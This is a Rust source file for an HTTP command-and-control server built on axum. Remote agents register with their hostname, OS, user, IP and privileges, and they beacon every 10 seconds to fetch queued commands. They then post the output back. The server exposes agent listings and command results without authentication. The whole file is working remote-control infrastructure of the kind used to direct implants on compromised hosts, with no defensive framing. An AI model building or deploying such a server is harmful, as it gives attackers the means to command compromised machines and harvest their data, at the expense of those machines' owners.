use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::Json,
    routing::{get, post},
    Router,
};
use chrono::Utc;
use std::{
    collections::VecDeque,
    net::SocketAddr,
    sync::{Arc, Mutex},
};

use crate::models::*;

// Add missing struct definition if not present in models.rs

/// Start the C2 HTTP server
pub async fn start_server() {
    // Create shared state that will be accessible to all handlers
    let state = Arc::new(Mutex::new(AppState::new()));

    // Build the router with all endpoints
    let app = Router::new()
        .route("/api/register", post(handle_register))
        .route("/api/beacon", post(handle_beacon))
        .route("/api/result", post(handle_result))
        .route("/api/command", post(handle_queue_command))
        .route("/api/agents", get(handle_list_agents))
        .route("/api/result/:command_id", get(handle_get_result))
        .with_state(state);

    // Bind to address
    let addr = SocketAddr::from(([0, 0, 0, 0], 8080));
    println!("🚀 C2 Server listening on http://{}", addr);
    println!("📡 Waiting for agents to connect...\n");

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn handle_register(
    State(state): State<SharedState>,
    Json(req): Json<RegisterRequest>,
) -> Json<RegisterResponse> {
    println!("📥 Registration request from agent: {}", req.agent_id);

    let mut state = state.lock().unwrap();

    let agent = Agent {
        id: req.agent_id.clone(),
        hostname: req.hostname,
        os: req.os,
        os_version: req.os_version,
        user: req.user,
        ip: req.ip,
        privileges: req.privileges,
        version: req.version,
        last_seen: Utc::now(),
        first_seen: Utc::now(),
    };

    // Store agent in HashMap
    state.agents.insert(req.agent_id.clone(), agent.clone());

    // Initialize empty command queue for this agent
    state
        .command_queues
        .insert(req.agent_id.clone(), VecDeque::new());

    println!("✅ Agent registered: {} ({})", agent.hostname, agent.id);
    println!(
        "   OS: {} | User: {} | IP: {}",
        agent.os, agent.user, agent.ip
    );

    // Return success response
    Json(RegisterResponse {
        success: true,
        message: "Agent registered successfully".to_string(),
        beacon_interval: 10, // Agent should beacon every 10 seconds
    })
}

async fn handle_beacon(
    State(state): State<SharedState>,
    Json(req): Json<BeaconRequest>,
) -> Json<BeaconResponse> {
    println!("💓 Beacon from agent: {}", req.agent_id);

    let mut state = state.lock().unwrap();

    // Update the agent's last_seen timestamp
    if let Some(agent) = state.agents.get_mut(&req.agent_id) {
        agent.last_seen = Utc::now();
    } else {
        println!("⚠️ Warning: Beacon from unknown agent: {}", req.agent_id);
    }

    // Get pending commands from the queue
    let commands: Vec<Command> = if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
        queue.drain(..).collect() // Remove all commands and return them
    } else {
        Vec::new()
    };

    if !commands.is_empty() {
        println!("   📤 Sending {} command(s) to agent", commands.len());
    }

    Json(BeaconResponse { commands })
}

async fn handle_result(
    State(state): State<SharedState>,
    Json(req): Json<ResultRequest>,
) -> Json<ResultResponse> {
    println!("📨 Result received for command: {}", req.command_id);

    let mut state = state.lock().unwrap();

    let command_result = CommandResult {
        agent_id: req.agent_id.clone(),
        command_id: req.command_id.clone(),
        success: req.success,
        output: req.output.clone(),
        timestamp: Utc::now(),
    };

    state.results.insert(req.command_id.clone(), command_result);

    println!("   Output:\n{}", req.output);

    Json(ResultResponse { success: true })
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/// Get all registered agents (helper function)
pub fn get_agents(state: &AppState) -> Vec<Agent> {
    state.agents.values().cloned().collect()
}

/// Get result for a command (helper function)
pub fn get_result(state: &AppState, command_id: &str) -> Option<CommandResult> {
    state.results.get(command_id).cloned()
}

/// Handle request to queue a command for an agent
async fn handle_queue_command(
    State(state): State<SharedState>,
    Json(req): Json<QueueCommandRequest>,
) -> Result<Json<QueueCommandResponse>, (StatusCode, String)> {
    println!("📤 Queuing command for agent: {}", req.agent_id);

    let mut state = state.lock().unwrap();

    // Check if agent exists
    if !state.agents.contains_key(&req.agent_id) {
        return Err((
            StatusCode::NOT_FOUND,
            format!("Agent {} not found", req.agent_id),
        ));
    }

    // Generate unique command ID
    let command_id = uuid::Uuid::new_v4().to_string();

    // Create command
    let command = Command {
        id: command_id.clone(),
        agent_id: req.agent_id.clone(),
        command_type: req.command_type,
        payload: req.payload,
        created_at: Utc::now(),
    };

    // Add to queue
    if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
        queue.push_back(command);
        println!("   ✅ Command queued successfully: {}", command_id);

        Ok(Json(QueueCommandResponse {
            success: true,
            command_id,
            message: "Command queued successfully".to_string(),
        }))
    } else {
        Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            "Failed to access command queue".to_string(),
        ))
    }
}

/// List all registered agents
async fn handle_list_agents(State(state): State<SharedState>) -> Json<ListAgentsResponse> {
    println!("📋 Listing all agents");

    let state = state.lock().unwrap();
    let agents: Vec<Agent> = state.agents.values().cloned().collect();

    println!("   Found {} agent(s)", agents.len());

    Json(ListAgentsResponse { agents })
}

/// Get result for a specific command
async fn handle_get_result(
    State(state): State<SharedState>,
    Path(command_id): Path<String>,
) -> Json<GetResultResponse> {
    println!("🔍 Looking up result for command: {}", command_id);

    let state = state.lock().unwrap();

    if let Some(result) = state.results.get(&command_id).cloned() {
        println!("   ✅ Result found");
        Json(GetResultResponse {
            success: true,
            result: Some(result),
            message: "Result found".to_string(),
        })
    } else {
        println!("   ⚠️ Result not found");
        Json(GetResultResponse {
            success: false,
            result: None,
            message: "Result not found".to_string(),
        })
    }
}
